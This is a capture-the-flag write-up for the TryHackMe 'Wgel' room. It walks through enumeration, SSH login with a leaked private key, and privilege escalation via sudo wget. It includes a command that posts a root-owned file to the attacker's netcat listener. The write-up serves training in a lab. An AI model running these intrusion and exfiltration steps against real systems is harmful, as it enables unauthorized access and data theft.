# CTF-Write-up

## Try Hack Me: Wgel

##### URL:  https://tryhackme.com/room/wgelctf

##### Created by _https://tryhackme.com/p/MrSeth6797_

![logo](https://user-images.githubusercontent.com/20625004/113441363-cf0e7080-93f6-11eb-9aa9-781ca8ab7f76.PNG)

You should deploy the machine first.

Run nmap against the target machine.

```nmap -sC -A <target IP>```

Port 22 ssh.
Port 80 web access. 

![apache2](https://user-images.githubusercontent.com/20625004/113437947-45f43b00-93f0-11eb-93ff-a6fe801a2585.PNG)

Fireup ``gobuster``.

``gobuster dir -u http://<Target IP/ -w <path to wordlist>``

![sitemap](https://user-images.githubusercontent.com/20625004/113438226-cfa40880-93f0-11eb-9a8a-cde994a75ae3.PNG)

Found sitemap.

![sitemap_1](https://user-images.githubusercontent.com/20625004/113438266-e6e2f600-93f0-11eb-9039-2f11de19acac.PNG)

Again fire ``gobuster`` with the new path.

``gobuster dir -u http://<Target IP/sitemap/ -w <path to wordlist>``

![ssh](https://user-images.githubusercontent.com/20625004/113438377-1db90c00-93f1-11eb-89a1-e681e8e4c3d7.PNG)

SSH? intersting let's dig.

![key](https://user-images.githubusercontent.com/20625004/113438453-43deac00-93f1-11eb-916b-73f754a07ebb.PNG)

Nice we have found a id_rsa key which is a key file for ssh. Download it to your system.

Since we have a private key, there has to be a username somewhere lets view source the web pages.

In the default apache page there is a name, simply view source and you will find ``jessie``.

Change also the permission of the id_rsa file ``chmod 600 id_rsa``.

lets use that name and connect ``ssh -i ida_rsa jessie@target ip``

And we have accessed the system.

![access](https://user-images.githubusercontent.com/20625004/113439632-9caf4400-93f3-11eb-8c18-ca708c512324.PNG)

With a find command we were able to find the first flag.

![find1](https://user-images.githubusercontent.com/20625004/113439920-2232f400-93f4-11eb-9d1e-65dff9c37c61.PNG)

Privilege escalation.

Issue ``sudo -l``, command to list the commands that the user can run as root.

![sudo](https://user-images.githubusercontent.com/20625004/113440097-6e7e3400-93f4-11eb-8aa9-2cb1255a0f68.PNG)

User can run wget command as root without password.

Always search at GTFOBins _https://gtfobins.github.io/gtfobins/wget/_.

We can download files to another machine. With that way we are going to copy the flag to our system.
After a lot of trials and error, we had a success.

On your own machine create a connection with netcat. ``nc -lnvp 4444``.
Now on the target machine use the wget to transfer the root file to your system.

![transfer](https://user-images.githubusercontent.com/20625004/113440712-9621cc00-93f5-11eb-944d-dc6f05550cc2.PNG)

``sudo /usr/bin/wget http://local ip:local port --post-file=/root/root_flag.txt``

![flag2](https://user-images.githubusercontent.com/20625004/113441219-94a4d380-93f6-11eb-8a7e-c6b6737f6e56.PNG)

We found the second flag.
